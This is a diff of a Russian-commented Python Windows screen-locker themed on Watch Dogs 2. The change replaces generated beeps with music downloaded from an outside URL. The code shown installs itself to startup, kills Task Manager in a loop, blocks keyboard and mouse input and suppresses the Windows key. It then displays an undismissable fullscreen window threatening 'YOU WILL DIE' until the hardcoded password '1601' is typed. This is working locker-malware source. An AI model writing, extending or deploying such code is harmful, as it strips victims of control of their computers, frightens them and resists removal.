@@ -1,27 +1,25 @@
-import ctypes
-import os
-import sys
-import time
-import threading
-import random
-import math
-import tkinter as tk
+import ctypes, os, sys, time, threading, random, tempfile, urllib.request, tkinter as tk
 
 # === НАСТРОЙКИ ===
 PASSWORD = "1601"
 TIMER_SECONDS = 15  # для теста, потом 600
+MUSIC_URL = "https://chrmbchrmb.skysound7.com/t/12678889381665472656-chrmbchrmb-matrix-bl-studio-loop-super-slowed/"
+MUSIC_FILE = os.path.join(tempfile.gettempdir(), "wd2_theme.mp3")
 
 # === БЛОКИРУЕМ КЛАВИАТУРУ И МЫШЬ ===
 def block_input(block=True):
     ctypes.windll.user32.BlockInput(block)
 
-# === БЛОКИРУЕМ WIN-КЛАВИШУ НАМЕРТВО ===
+# === БЛОКИРУЕМ WIN-КЛАВИШУ ===
 def block_win_key():
-    import keyboard
-    keyboard.add_hotkey('windows', lambda: None, suppress=True)
-    keyboard.add_hotkey('win', lambda: None, suppress=True)
+    try:
+        import keyboard
+        keyboard.add_hotkey('windows', lambda: None, suppress=True)
+        keyboard.add_hotkey('win', lambda: None, suppress=True)
+    except:
+        pass
 
-# === УБИВАЕМ ДИСПЕТЧЕР ЗАДАЧ КАЖДЫЕ 100 МС ===
+# === УБИВАЕМ ДИСПЕТЧЕР ЗАДАЧ ===
 def kill_taskmgr():
     while True:
         os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
@@ -40,48 +38,30 @@ def add_to_startup():
     except:
         pass
 
-# === ГЕНЕРИРУЕМ КИБЕР-ЗВУКИ (замена музыки, не требует файла) ===
-def play_cyber_music():
-    import winsound
-    while True:
-        freq = random.randint(200, 800)
-        duration = random.randint(50, 200)
-        winsound.Beep(freq, duration)
-        time.sleep(random.uniform(0.1, 0.5))
-
-# === ЭФФЕКТЫ ЧАСТИЦ ===
-particles = []
-def spawn_particles(canvas):
-    for _ in range(20):
-        x = random.randint(0, 800)
-        y = random.randint(0, 600)
-        dx = random.uniform(-2, 2)
-        dy = random.uniform(-2, 2)
-        particle = canvas.create_oval(x, y, x+3, y+3, fill='#0f0', outline='#0f0')
-        particles.append((particle, dx, dy))
-
-def move_particles(canvas):
-    for i, (particle, dx, dy) in enumerate(particles):
-        canvas.move(particle, dx, dy)
-        x1, y1, x2, y2 = canvas.coords(particle)
-        if x1 <= 0 or x2 >= 800:
-            dx = -dx
-        if y1 <= 0 or y2 >= 600:
-            dy = -dy
-        particles[i] = (particle, dx, dy)
+# === СКАЧИВАЕМ И ИГРАЕМ МУЗЫКУ (РЕПИТ НАВСЕГДА) ===
+def play_music():
+    if not os.path.exists(MUSIC_FILE):
+        try:
+            urllib.request.urlretrieve(MUSIC_URL, MUSIC_FILE)
+        except:
+            pass
+    try:
+        import pygame.mixer as mixer
+        mixer.init()
+        mixer.music.load(MUSIC_FILE)
+        mixer.music.play(-1)
+    except:
+        pass
 
 # === АНИМАЦИЯ ВЗЛОМА 0% → 100% ===
 def show_boot_animation():
     root = tk.Tk()
     root.attributes('-fullscreen', True)
     root.configure(bg='black')
-    
     lbl = tk.Label(root, text="", fg='#0f0', bg='black', font=('Courier', 36, 'bold'))
     lbl.pack(expand=True)
-    
     bar = tk.Canvas(root, width=600, height=30, bg='black', highlightthickness=0)
     bar.pack(pady=20)
-    
     for i in range(0, 101, 5):
         lbl.config(text=f"ВЗЛОМ ctOS 2.0: {i}%")
         bar.delete("progress")
@@ -96,7 +76,6 @@ class WinLocker:
     def __init__(self):
         self.root = tk.Tk()
         self.root.withdraw()
-        
         self.win = tk.Toplevel(self.root)
         self.win.attributes('-fullscreen', True)
         self.win.attributes('-topmost', True)
@@ -104,34 +83,21 @@ class WinLocker:
         self.win.overrideredirect(True)
         self.win.protocol("WM_DELETE_WINDOW", lambda: None)
         
-        # Полотно для рисования
         self.canvas = tk.Canvas(self.win, bg='black', highlightthickness=0)
         self.canvas.pack(fill='both', expand=True)
         
-        # Заголовки
-        self.canvas.create_text(400, 80, text="ВЫ УМРЁТЕ",
-                               fill='red', font=('Courier', 60, 'bold'), tags="title")
-        self.canvas.create_text(400, 160, text="СИСТЕМА ЗАБЛОКИРОВАНА",
-                               fill='red', font=('Courier', 36))
-        self.canvas.create_text(400, 300, text="ВВЕДИТЕ ПАРОЛЬ:",
-                               fill='red', font=('Courier', 28))
+        # Страшные надписи
+        self.canvas.create_text(400, 80, text="ВЫ УМРЁТЕ", fill='red', font=('Courier', 60, 'bold'), tags="title")
+        self.canvas.create_text(400, 160, text="СИСТЕМА ЗАБЛОКИРОВАНА", fill='red', font=('Courier', 36))
+        self.canvas.create_text(400, 300, text="ВВЕДИТЕ ПАРОЛЬ:", fill='red', font=('Courier', 28))
         
         # Поле ввода
-        self.entry = tk.Entry(self.win, show="*", font=('Courier', 28),
-                             bg='black', fg='red', insertbackground='red')
+        self.entry = tk.Entry(self.win, show="*", font=('Courier', 28), bg='black', fg='red', insertbackground='red')
         self.canvas.create_window(400, 360, window=self.entry)
-        
-        # Статус
-        self.status = self.canvas.create_text(400, 420, text="",
-                                             fill='red', font=('Courier', 20))
+        self.status = self.canvas.create_text(400, 420, text="", fill='red', font=('Courier', 20))
         
         self.entry.bind('<Return>', self.check_password)
         self.entry.focus_set()
-        
-        # Запускаем частицы
-        spawn_particles(self.canvas)
-        
-        # Запускаем анимацию
         self.animate()
     
     def check_password(self, event=None):
@@ -144,10 +110,6 @@ class WinLocker:
             self.entry.delete(0, tk.END)
     
     def animate(self):
-        # Двигаем частицы
-        move_particles(self.canvas)
-        
-        # Удаляем старый череп и рисуем новый (эффект тряски)
         self.canvas.delete("skull")
         x_offset = random.randint(-5, 5)
         y_offset = random.randint(-5, 5)
@@ -161,42 +123,26 @@ class WinLocker:
         ]
         y = 480
         for line in lines:
-            self.canvas.create_text(400 + x_offset, y + y_offset,
-                                   text=line, fill='red', font=('Courier', 16),
-                                   tags="skull")
+            self.canvas.create_text(400 + x_offset, y + y_offset, text=line, fill='red', font=('Courier', 16), tags="skull")
             y += 22
-        
-        # Мерцание страшной надписи
+        for _ in range(30):
+            x, y = random.randint(0, 800), random.randint(0, 600)
+            s = random.randint(2, 5)
+            self.canvas.create_oval(x, y, x+s, y+s, fill='red', outline='red', tags="particle")
         if random.random() < 0.1:
             self.canvas.itemconfig("title", fill='#0f0')
         else:
             self.canvas.itemconfig("title", fill='red')
-        
         self.win.after(50, self.animate)
 
 # === ЗАПУСК ===
 if __name__ == "__main__":
-    # Добавляем в автозагрузку
     add_to_startup()
-    
-    # Запускаем убийцу Task Manager
     threading.Thread(target=kill_taskmgr, daemon=True).start()
-    
-    # Таймер до активации
     time.sleep(TIMER_SECONDS)
-    
-    # Блокируем ввод
     block_input(True)
-    
-    # Блокируем Win-клавишу
     threading.Thread(target=block_win_key, daemon=True).start()
-    
-    # Запускаем музыку
-    threading.Thread(target=play_cyber_music, daemon=True).start()
-    
-    # Показываем анимацию загрузки
+    threading.Thread(target=play_music, daemon=True).start()
     show_boot_animation()
-    
-    # Запускаем главный экран блокировки
     app = WinLocker()
     app.root.mainloop()
